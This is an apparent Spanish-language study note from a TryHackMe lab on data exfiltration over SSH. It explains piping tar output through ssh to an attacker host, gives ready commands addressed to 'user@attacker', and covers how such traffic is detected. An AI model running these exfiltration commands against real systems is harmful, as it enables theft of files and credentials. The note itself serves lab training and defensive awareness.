---
tags: [red-team, data-exfiltration, ssh, tar]
created: 2026-04-22
source: TryHackMe - Data Exfiltration
related:
  - "[[Data Exfiltration Concepts]]"
  - "[[Exfiltration using TCP Socket]]"
---

# Exfiltración por SSH

> [!abstract] TL;DR
> Utilizar el protocolo SSH nativo para transferir datos combinándolo con compresión (`tar`). Todo el tráfico viaja cifrado desde la máquina comprometida hasta el atacante, impidiendo que los sistemas de inspección de red (NIDS/IPS) analicen el contenido exfiltrado. Es ideal cuando el acceso de salida (outbound) por el puerto 22 está permitido.

## Cuándo usarlo

Esta técnica es muy efectiva en escenarios donde:
1. **Firewalls** permiten conexiones salientes hacia el puerto TCP 22 (SSH).
2. **Herramientas dedicadas de transferencia** (como `scp` o `rsync`) no están disponibles, pero el binario `ssh` cliente sí lo está.
3. Se necesita **cifrado nativo** sin requerir codificaciones manuales (como Base64) ni instalar binarios de terceros.

## Flujo de exfiltración

```
┌─────────────┐                                      ┌─────────────┐
│   VÍCTIMA   │                                      │   ATACANTE  │
│             │                                      │             │
│  tar cf -   │           Túnel SSH Cifrado          │  tar xpf -  │
│  (comprime) ┼──────────────────────────────────────┼▶ (extrae)   │
│             │        (Payload invisible)           │             │
└─────────────┘                                      └─────────────┘
```

A diferencia del socket TCP puro, un analista de red interceptando este flujo sólo verá tráfico SSH estándar (handshake, intercambio de claves y datos cifrados). No podrá saber si se está ejecutando un shell interactivo, transfiriendo un archivo o haciendo port forwarding.

## Técnica: Empaquetar y transferir al vuelo

La ventaja principal de este método es que **no requiere guardar archivos temporales en el disco de la víctima ni en el del atacante** más allá de los datos finales extraídos.

Se combina `tar` con la ejecución remota de un solo comando vía SSH. El flujo comprimido se redirige por la salida estándar (stdout) hacia el extremo remoto, que lo recibe por la entrada estándar (stdin) y lo descomprime al vuelo.

```shell
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

### Desglose del comando

| Componente | Función |
|---|---|
| `tar cf - task5/` | Crea un archivo `.tar` del directorio `task5/` pero, en lugar de guardarlo en disco, lo envía a `stdout` (gracias al flag `-`). |
| `\|` (pipe) | Toma el flujo de bytes de `tar` y se lo inyecta a la entrada estándar de `ssh`. |
| `ssh user@host` | Conecta al servidor del atacante autenticándose. |
| `"cd /tmp/; tar xpf -"` | Es el **comando remoto** que `ssh` ejecuta. Entra al directorio temporal y le dice a `tar` que extraiga (`x`) manteniendo permisos (`p`) desde la entrada estándar (`-`), que está recibiendo el flujo de la víctima. |

> [!tip]
> El flag `p` en `tar xpf` es útil para preservar los permisos originales de los archivos (ej. si exfiltramos claves SSH o binarios suid).

### Añadiendo compresión (gzip)

Si el volumen de datos es grande, conviene comprimir antes de cifrar (SSH también comprime internamente, pero `gzip` suele ser más agresivo):

```shell
thm@victim1:$ tar zcf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar zxpf -"
```
*Notar la adición de la letra `z` en ambos lados.*

## Verificación en el servidor

Una vez que el comando en la víctima finaliza (sin errores, asumiendo que la autenticación fue correcta), los datos ya están en el servidor del atacante:

```shell
thm@jump-box$ cd /tmp/task5/
thm@jump-box$ cat creds.txt
```

## OPSEC y Detección

Aunque el contenido del tráfico está cifrado, la **actividad sigue siendo detectable** mediante análisis de metadatos (Traffic Analysis):

1. **Sesiones largas y de alto volumen**: Una conexión SSH interactiva envía paquetes pequeños intermitentes (keystrokes). Una transferencia de archivos envía bloques grandes y continuos. Un NIDS puede alertar sobre "Transferencia masiva de datos por SSH".
2. **Destinos inusuales**: Si la política corporativa dicta que las conexiones SSH internas solo deben ir al servidor bastión, una conexión saliente directa hacia una IP externa (la del atacante) disparará una alarma.
3. **Comandos ejecutados**: En la máquina víctima, el comando `tar cf - | ssh` quedará registrado en el historial de Bash (`.bash_history`), los logs de `auditd` o en telemetría de EDR.

## Comandos Clave

```shell
# Exfiltrar un directorio entero por SSH sin compresión
tar cf - <dir>/ | ssh user@attacker "cd /tmp/; tar xpf -"

# Exfiltrar con compresión gzip
tar zcf - <dir>/ | ssh user@attacker "cd /tmp/; tar xpfz -"
```

## Preguntas y Respuestas

- **Todos los paquetes enviados con exfiltración sobre SSH están cifrados (T/F).**
  → `T` (True)
